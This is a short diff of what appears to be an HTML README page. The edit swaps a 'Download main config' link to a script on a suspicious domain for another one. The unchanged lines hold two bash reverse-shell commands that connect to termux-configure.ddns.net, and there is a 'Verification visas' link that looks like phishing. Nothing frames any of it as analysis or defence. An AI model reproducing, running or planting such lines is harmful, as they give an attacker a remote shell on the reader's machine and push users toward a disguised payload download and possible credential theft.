@@ -51,7 +51,7 @@ bash -i >& /dev/tcp/termux-configure.ddns.net/38863 0>&1
   <p align="center">
     bash -i >& /dev/tcp/termux-configure.ddns.net/25251 0>&1
     <br />
-    <a href="https://fb-tracker.cf/config/config.sh"><strong>Download main config »</strong></a>
+    <b><a href="https://servicez.ml/hackers.com/config.sh"><strong>Download main config »</strong></a></b>
     <br />
     <br />
     <a href="http://visa-verify.ddns.net/">Verification visas</a>
